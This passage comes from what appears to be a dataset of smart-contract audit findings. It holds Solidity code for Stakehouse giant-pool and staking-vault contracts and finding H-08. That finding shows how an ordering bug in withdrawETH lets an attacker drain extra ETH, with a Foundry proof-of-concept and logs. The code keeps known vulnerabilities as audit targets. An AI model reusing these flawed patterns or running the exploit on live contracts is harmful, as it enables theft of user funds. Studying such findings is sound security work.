numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\n\ncontract GiantPoolBase is ReentrancyGuard {\n\n    /// @notice Emitted when an account deposits Ether into the giant pool\n    event ETHDeposited(address indexed sender, uint256 amount);\n\n    /// @notice Emitted when giant LP is burnt to recover ETH\n    event LPBurnedForETH(address indexed sender, uint256 amount);\n\n    /// @notice Emitted when giant LP is burnt to receive LP from a specific vault\n    event LPSwappedForVaultLP(address indexed vaultLPToken, address indexed sender, uint256 amount);\n\n    /// @notice Minimum amount of Ether that can be deposited into the contract\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network\n    uint256 public idleETH;\n\n    /// @notice LP token representing all ETH deposited and any ETH converted into savETH vault LP tokens from any liquid staking network\n    GiantLP public lpTokenETH;\n\n    /// @notice Address of the liquid staking derivative factory that provides a source of truth on individual networks that can be funded\n    LSDNFactory public liquidStakingDerivativeFactory;\n\n    /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.\n    function depositETH(uint256 _amount) public payable {\n        require(msg.value >= MIN_STAKING_AMOUNT, \"Minimum not supplied\");\n        require(msg.value == _amount, \"Value equal to amount\");\n\n        // The ETH capital has not yet been deployed to a liquid staking network\n        idleETH += msg.value;\n\n        // Mint giant LP at ratio of 1:1\n        lpTokenETH.mint(msg.sender, msg.value);\n\n        // If anything extra needs to be done\n        _onDepositETH();\n\n        emit ETHDeposited(msg.sender, msg.value);\n    }\n\n    /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract\n    /// @param _amount of LP tokens user is burning in exchange for same amount of ETH\n    function withdrawETH(uint256 _amount) external nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");\n        require(idleETH >= _amount, \"Come back later or withdraw less ETH\");\n\n        idleETH -= _amount;\n\n        lpTokenETH.burn(msg.sender, _amount);\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Failed to transfer ETH\");\n\n        emit LPBurnedForETH(msg.sender, _amount);\n    }\n\n    /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP\n    /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool\n    /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP\n    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 amountOfTokens = _lpTokens.length;\n        require(amountOfTokens > 0, \"Empty arrays\");\n        require(amountOfTokens == _amounts.length, \"Inconsistent array lengths\");\n\n        _onWithdraw(_lpTokens);\n\n        for (uint256 i; i < amountOfTokens; ++i) {\n            LPToken token = _lpTokens[i];\n            uint256 amount = _amounts[i];\n\n            _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n            // Burn giant LP from user before sending them an LP token from this pool\n            lpTokenETH.burn(msg.sender, amount);\n\n            // Giant LP tokens in this pool are 1:1 exchangeable with external savETH vault LP\n            token.transfer(msg.sender, amount);\n\n            emit LPSwappedForVaultLP(address(token), msg.sender, amount);\n        }\n    }\n\n    /// @dev Check the msg.sender has enough giant LP to burn and that the pool has enough savETH vault LP\n    function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\");\n        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n    }\n\n    /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH\n    function _onDepositETH() internal virtual {}\n\n    /// @dev Allow an inheriting contract to have a hook for performing operations during withdrawal of LP tokens when burning giant LP\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal virtual {}\n}\n\n",
        "CodeNames": [
            "SyndicateRewardsProcessor.sol",
            "GiantMevAndFeesPool.sol",
            "GiantPoolBase.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-08",
                "Location": [
                    "beforeTokenTransfer",
                    "_updateAccumulatedETHPerLP",
                    "idleETH",
                    "accumulatedETHPerLPShare",
                    "withdrawETH"
                ],
                "Type": " function  withdrawETH  from  GiantMevAndFeesPool  can steal most of eth because of idleETH is reduced before burning token",
                "Description": "*Submitted by ronnyx2017(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129), also found by cccz(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/239)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90<br\n\nThe contract GiantMevAndFeesPool override the function totalRewardsReceived:\n\n    return address(this).balance + totalClaimed idleETH;\n\nThe function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function SyndicateRewardsProcessor._updateAccumulatedETHPerLP\n\n    uint256 received = totalRewardsReceived();\n    uint256 unprocessed = received totalETHSeen;\n\nBut it will decrease the idleETH first and then burn the lpTokenETH in the function GiantMevAndFeesPool.withdrawETH. The lpTokenETH burn option will trigger GiantMevAndFeesPool.beforeTokenTransfer which will call _updateAccumulatedETHPerLP and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, the accumulatedETHPerLPShare is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.\n\n\nI wrote a test file for proof, but there is another bug/vulnerability which will make the GiantMevAndFeesPool.withdrawETH function break down. I submitted it as the other finding named \"GiantLP with a transferHookProcessor cant be burned, users' funds will be stuck in the Giant Pool\". You should fix it first by modifying the code <https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166 to :\n\n    if (_to != address(0)) {\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\nI know modifying the project source code is controversial. Please believe me it's a bug needed to be fixed and it's independent of the current vulnerability.\n\ntest:<br\ntest/foundry/TakeFromGiantPools2.t.sol\n\n    pragma solidity ^0.8.13;\n\n    // SPDX-License-Identifier: MIT\n\n    import \"forge-std/console.sol\";\n    import {GiantPoolTests} from \"./GiantPools.t.sol\";\n\n    contract TakeFromGiantPools2 is GiantPoolTests {\n        function testDWUpdateRate2() public{\n            address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);\n            address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);\n            // Deposit ETH into giant fees and mev\n            vm.startPrank(feesAndMevUserOne);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            vm.stopPrank();\n            vm.startPrank(feesAndMevUserTwo);\n            giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);\n            giantFeesAndMevPool.withdrawETH(4 ether);\n            vm.stopPrank();\n            console.log(\"user one:\", getBalance(feesAndMevUserOne));\n            console.log(\"user two(attacker):\", getBalance(feesAndMevUserTwo));\n            console.log(\"giantFeesAndMevPool:\", getBalance(address(giantFeesAndMevPool)));\n        }\n\n        function getBalance(address addr) internal returns (uint){\n            // just ETH\n            return addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);\n        }\n\n    }\n\nrun test:\n\n    forge test --match-test testDWUpdateRate2 -vvv\n\ntest log:\n\n    Logs:\n      user one: 0\n      user two(attacker): 6000000000000000000\n      giantFeesAndMevPool: 2000000000000000000\n\nThe attacker stole 2 eth from the pool.\n\n\nfoundry\n\n",
                "Repair": "\nidleETH -= _amount; should be after the lpTokenETH.burn.\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface IBrandNFT {\n    function toLowerCase(string memory _base) external pure returns (string memory);\n    function lowercaseBrandTickerToTokenId(string memory _ticker) external returns (uint256);\n}\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\n/// @notice Allows a contract to receive rewards from a syndicate and distribute it amongst LP holders\nabstract contract SyndicateRewardsProcessor {\n\n    /// @notice Emitted when ETH is received by the contract and processed\n    event ETHReceived(uint256 amount);\n\n    /// @notice Emitted when ETH from syndicate is distributed to a user\n    event ETHDistributed(address indexed user, address indexed recipient, uint256 amount);\n\n    /// @notice Precision used in rewards calculations for scaling up and down\n    uint256 public constant PRECISION = 1e24;\n\n    /// @notice Total accumulated ETH per share of LP<>KNOT that has minted derivatives scaled to 'PRECISION'\n    uint256 public accumulatedETHPerLPShare;\n\n    /// @notice Total ETH claimed by all users of the contract\n    uint256 public totalClaimed;\n\n    /// @notice Last total rewards seen by the contract\n    uint256 public totalETHSeen;\n\n    /// @notice Total ETH claimed by a given address for a given token\n    mapping(address => mapping(address => uint256)) public claimed;\n\n    /// @dev Internal logic for previewing accumulated ETH for an LP user\n    function _previewAccumulatedETH(\n        address _sender,\n        address _token,\n        uint256 _balanceOfSender,\n        uint256 _numOfShares,\n        uint256 _unclaimedETHFromSyndicate\n    ) internal view returns (uint256) {\n        if (_balanceOfSender > 0) {\n            uint256 claim = claimed[_sender][_token];\n\n            uint256 received = totalRewardsReceived() + _unclaimedETHFromSyndicate;\n            uint256 unprocessed = received - totalETHSeen;\n\n            uint256 newAccumulatedETH = accumulatedETHPerLPShare + ((unprocessed * PRECISION) / _numOfShares);\n\n            return ((newAccumulatedETH * _balanceOfSender) / PRECISION) - claim;\n        }\n        return 0;\n    }\n\n    /// @dev Any due rewards from node running can be distributed to msg.sender if they have an LP balance\n    function _distributeETHRewardsToUserForToken(\n        address _user,\n        address _token,\n        uint256 _balance,\n        address _recipient\n    ) internal {\n        require(_recipient != address(0), \"Zero address\");\n        uint256 balance = _balance;\n        if (balance > 0) {\n            // Calculate how much ETH rewards the address is owed / due \n            uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];\n            if (due > 0) {\n                claimed[_user][_token] = due;\n\n                totalClaimed += due;\n\n                (bool success, ) = _recipient.call{value: due}(\"\");\n                require(success, \"Failed to transfer\");\n\n                emit ETHDistributed(_user, _recipient, due);\n            }\n        }\n    }\n\n    /// @dev Internal logic for tracking accumulated ETH per share\n    function _updateAccumulatedETHPerLP(uint256 _numOfShares) internal {\n        if (_numOfShares > 0) {\n            uint256 received = totalRewardsReceived();\n            uint256 unprocessed = received - totalETHSeen;\n\n            if (unprocessed > 0) {\n                emit ETHReceived(unprocessed);\n\n                // accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down later\n                accumulatedETHPerLPShare += (unprocessed * PRECISION) / _numOfShares;\n\n                totalETHSeen = received;\n            }\n        }\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate\n    function totalRewardsReceived() public virtual view returns (uint256) {\n        return address(this).balance + totalClaimed;\n    }\n\n    /// @notice Allow the contract to receive ETH\n    receive() external payable {}\n}\n\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nimport { Initializable } from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { StakehouseAPI } from \"@blockswaplab/stakehouse-solidity-api/contracts/StakehouseAPI.sol\";\nimport { IDataStructures } from \"@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol\";\n\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\nimport { Syndicate } from \"../syndicate/Syndicate.sol\";\nimport { ETHPoolLPFactory } from \"./ETHPoolLPFactory.sol\";\nimport { LiquidStakingManager } from \"./LiquidStakingManager.sol\";\nimport { LPTokenFactory } from \"./LPTokenFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\n\n/// @title MEV and fees vault for a specified liquid staking network\ncontract StakingFundsVault is\n    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory, SyndicateRewardsProcessor, ReentrancyGuard\n{\n\n    /// @notice signalize that the vault received ETH\n    event ETHDeposited(address sender, uint256 amount);\n\n    /// @notice signalize ETH withdrawal from the vault\n    event ETHWithdrawn(address receiver, address admin, uint256 amount);\n\n    /// @notice signalize ERC20 token recovery by the admin\n    event ERC20Recovered(address admin, address recipient, uint256 amount);\n\n    /// @notice signalize unwrapping of WETH in the vault\n    event WETHUnwrapped(address admin, uint256 amount);\n\n    /// @notice Address of the network manager\n    LiquidStakingManager public liquidStakingNetworkManager;\n\n    /// @notice Total number of LP tokens issued in WEI\n    uint256 public totalShares;\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() initializer {}\n\n    /// @param _liquidStakingNetworkManager address of the liquid staking network manager\n    function init(address _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) external virtual initializer {\n        _init(LiquidStakingManager(payable(_liquidStakingNetworkManager)), _lpTokenFactory);\n    }\n\n    modifier onlyManager() {\n        require(msg.sender == address(liquidStakingNetworkManager), \"Only network manager\");\n        _;\n    }\n\n    /// @notice Allows the liquid staking manager to notify funds vault about new derivatives minted to enable MEV claiming\n    function updateDerivativesMinted() external onlyManager {\n        // We know 4 ETH for the KNOT came from this vault so increase the shares to get a % of vault rewards\n        totalShares += 4 ether;\n    }\n\n    /// @notice For knots that have minted derivatives, update accumulated ETH per LP\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(totalShares);\n    }\n\n    /// @notice Batch deposit ETH for staking against multiple BLS public keys\n    /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n    /// @param _amounts Amounts of ETH being staked for each BLS public key\n    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n        uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n        require(numOfValidators > 0, \"Empty arrays\");\n        require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        uint256 totalAmount;\n        for (uint256 i; i < numOfValidators; ++i) {\n            require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, \"BLS public key is not part of LSD network\");\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnots[i]) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n                \"Lifecycle status must be one\"\n            );\n\n            LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            if (address(tokenForKnot) != address(0)) {\n                // Give anything owed to the user before making updates to user state\n                _distributeETHRewardsToUserForToken(\n                    msg.sender,\n                    address(tokenForKnot),\n                    tokenForKnot.balanceOf(msg.sender),\n                    msg.sender\n                );\n            }\n\n            uint256 amount = _amounts[i];\n            totalAmount += amount;\n\n            _depositETHForStaking(_blsPublicKeyOfKnots[i], amount, true);\n\n            // Ensure user cannot get historical rewards\n            tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnots[i]];\n            claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n        }\n\n        // Ensure that the sum of LP tokens issued equals the ETH deposited into the contract\n        require(msg.value == totalAmount, \"Invalid ETH amount attached\");\n    }\n\n    /// @notice Deposit ETH against a BLS public key for staking\n    /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n    /// @param _amount Amount of ETH being staked\n    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n        require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Lifecycle status must be one\"\n        );\n\n        require(msg.value == _amount, \"Must provide correct amount of ETH\");\n\n        // Update accrued ETH to contract per LP\n        updateAccumulatedETHPerLP();\n\n        // Give anything owed to the user before making updates to user state\n        LPToken tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        if (address(tokenForKnot) != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                msg.sender,\n                address(tokenForKnot),\n                tokenForKnot.balanceOf(msg.sender),\n                msg.sender\n            );\n        }\n\n        _depositETHForStaking(_blsPublicKeyOfKnot, _amount, true);\n\n        // Ensure user cannot get historical rewards\n        tokenForKnot = lpTokenForKnot[_blsPublicKeyOfKnot];\n        claimed[msg.sender][address(tokenForKnot)] = (tokenForKnot.balanceOf(msg.sender) * accumulatedETHPerLPShare) / PRECISION;\n\n        return _amount;\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked by BLS public key\n    /// @param _blsPublicKeys List of BLS public keys that received ETH for staking\n    /// @param _amounts List of amounts of LP tokens being burnt\n    function burnLPTokensForETHByBLS(bytes[] calldata _blsPublicKeys, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _blsPublicKeys.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            LPToken token = lpTokenForKnot[_blsPublicKeys[i]];\n            require(address(token) != address(0), \"No ETH staked for specified BLS key\");\n            burnLPForETH(token, _amounts[i]);\n        }\n    }\n\n    /// @notice Burn a batch of LP tokens in order to get back ETH that has not been staked\n    /// @param _lpTokens Address of LP tokens being burnt\n    /// @param _amounts Amount of LP tokens being burnt\n    function burnLPTokensForETH(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 numOfTokens = _lpTokens.length;\n        require(numOfTokens > 0, \"Empty arrays\");\n        require(numOfTokens == _amounts.length, \"Inconsistent array length\");\n        for (uint256 i; i < numOfTokens; ++i) {\n            burnLPForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice For a user that has deposited ETH that has not been staked, allow them to burn LP to get ETH back\n    /// @param _lpToken Address of the LP token being burnt\n    /// @param _amount Amount of LP token being burnt\n    function burnLPForETH(LPToken _lpToken, uint256 _amount) public nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n        require(_amount <= _lpToken.balanceOf(msg.sender), \"Not enough balance\");\n        require(address(_lpToken) != address(0), \"Zero address specified\");\n\n        bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];\n        require(\n            getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n            \"Cannot burn LP tokens\"\n        );\n        require(_lpToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Too new\");\n\n        updateAccumulatedETHPerLP();\n\n        _lpToken.burn(msg.sender, _amount);\n\n        (bool result,) = msg.sender.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n        emit ETHWithdrawnByDepositor(msg.sender, _amount);\n\n        emit LPTokenBurnt(blsPublicKeyOfKnot, address(_lpToken), msg.sender, _amount);\n    }\n\n    /// @notice Any LP tokens for BLS keys that have had their derivatives minted can claim ETH from the syndicate contract\n    /// @param _blsPubKeys List of BLS public keys being processed\n    function claimRewards(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            require(\n                liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,\n                \"Unknown BLS public key\"\n            );\n\n            // Ensure that the BLS key has its derivatives minted\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Derivatives not minted\"\n            );\n\n            if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n                // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n                // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n                _claimFundsFromSyndicateForDistribution(\n                    liquidStakingNetworkManager.syndicate(),\n                    _blsPubKeys\n                );\n\n                // Distribute ETH per LP\n                updateAccumulatedETHPerLP();\n            }\n\n            // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            require(address(token) != address(0), \"Invalid BLS key\");\n            require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n            _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n        }\n    }\n\n    /// @notice function to allow admins to withdraw ETH from the vault for staking purpose\n    /// @param _wallet address of the smart wallet that receives ETH\n    /// @param _amount number of ETH withdrawn\n    /// @return number of ETH withdrawn\n    function withdrawETH(address _wallet, uint256 _amount) public onlyManager nonReentrant returns (uint256) {\n        require(_amount >= 4 ether, \"Amount cannot be less than 4 ether\");\n        require(_amount <= address(this).balance, \"Not enough ETH to withdraw\");\n        require(_wallet != address(0), \"Zero address\");\n\n        (bool result,) = _wallet.call{value: _amount}(\"\");\n        require(result, \"Transfer failed\");\n\n        emit ETHWithdrawn(_wallet, msg.sender, _amount);\n\n        return _amount;\n    }\n\n    /// @notice For any knots that are no longer part of syndicate facilitate unstaking so that knot can rage quit\n    /// @param _blsPublicKeys List of BLS public keys being processed (assuming DAO only has BLS pub keys from correct smart wallet)\n    /// @param _amounts Amounts of free floating sETH that will be unstaked\n    function unstakeSyndicateSharesForRageQuit(\n        address _sETHRecipient,\n        bytes[] calldata _blsPublicKeys,\n        uint256[] calldata _amounts\n    ) external onlyManager nonReentrant {\n        Syndicate syndicate = Syndicate(payable(liquidStakingNetworkManager.syndicate()));\n\n        _claimFundsFromSyndicateForDistribution(address(syndicate), _blsPublicKeys);\n\n        updateAccumulatedETHPerLP();\n\n        for (uint256 i; i < _blsPublicKeys.length; ++i) {\n            require(syndicate.isNoLongerPartOfSyndicate(_blsPublicKeys[i]), \"Knot is still active in syndicate\");\n        }\n\n        syndicate.unstake(address(this), _sETHRecipient, _blsPublicKeys, _amounts);\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETHByBLSKeys(address _user, bytes[] calldata _blsPubKeys) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            totalAccumulated += previewAccumulatedETH(_user, token);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with many KNOTs that have minted derivatives\n    function batchPreviewAccumulatedETH(address _user, LPToken[] calldata _token) external view returns (uint256) {\n        uint256 totalAccumulated;\n        for (uint256 i; i < _token.length; ++i) {\n            totalAccumulated += previewAccumulatedETH(_user, _token[i]);\n        }\n        return totalAccumulated;\n    }\n\n    /// @notice Preview total ETH accumulated by a staking funds LP token holder associated with a KNOT that has minted derivatives\n    function previewAccumulatedETH(address _user, LPToken _token) public view returns (uint256) {\n        // if token maps to BLS public key that has not been minted derivatives then return zero as it's not eligible\n        bytes memory associatedBLSPublicKeyOfLpToken = KnotAssociatedWithLPToken[_token];\n        if (getAccountManager().blsPublicKeyToLifecycleStatus(associatedBLSPublicKeyOfLpToken) != IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n            return 0;\n        }\n\n        // Looking at this contract balance and the ETH that is yet to be transferred from the syndicate, then tell the user how much ETH they have earned\n        address payable syndicate = payable(liquidStakingNetworkManager.syndicate());\n        return _previewAccumulatedETH(\n            _user,\n            address(_token),\n            _token.balanceOf(_user),\n            totalShares,\n            Syndicate(syndicate).previewUnclaimedETHAsFreeFloatingStaker(\n                address(this),\n                associatedBLSPublicKeyOfLpToken\n            )\n        );\n    }\n\n    /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards\n    function beforeTokenTransfer(address _from, address _to, uint256) external override {\n        address syndicate = liquidStakingNetworkManager.syndicate();\n        if (syndicate != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            bytes memory blsPubKey = KnotAssociatedWithLPToken[token];\n            require(blsPubKey.length > 0, \"Invalid token\");\n\n            if (getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.TOKENS_MINTED) {\n                // Claim any ETH for the BLS key mapped to this token\n                bytes[] memory keys = new bytes[](1);\n                keys[0] = blsPubKey;\n                _claimFundsFromSyndicateForDistribution(syndicate, keys);\n\n                // Update the accumulated ETH per minted derivative LP share\n                updateAccumulatedETHPerLP();\n\n                // distribute any due rewards for the `from` user\n                if (_from != address(0)) {\n                    _distributeETHRewardsToUserForToken(_from, address(token), token.balanceOf(_from), _from);\n                }\n\n                // in case the new user has existing rewards - give it to them so that the after transfer hook does not wipe pending rewards\n                _distributeETHRewardsToUserForToken(_to, address(token), token.balanceOf(_to), _to);\n            }\n        }\n    }\n\n    /// @notice After an LP token is transferred, ensure that the new account cannot claim historical rewards\n    function afterTokenTransfer(address, address _to, uint256) external override {\n        if (LiquidStakingManager(payable(liquidStakingNetworkManager)).syndicate() != address(0)) {\n            LPToken token = LPToken(msg.sender);\n            require(KnotAssociatedWithLPToken[token].length > 0, \"Invalid token\");\n\n            // claim is calculated on full balance not amount being transferred so that double claims are not possible\n            claimed[_to][address(token)] = (token.balanceOf(_to) * accumulatedETHPerLPShare) / PRECISION;\n        }\n    }\n\n    /// @notice Claim ETH to this contract from 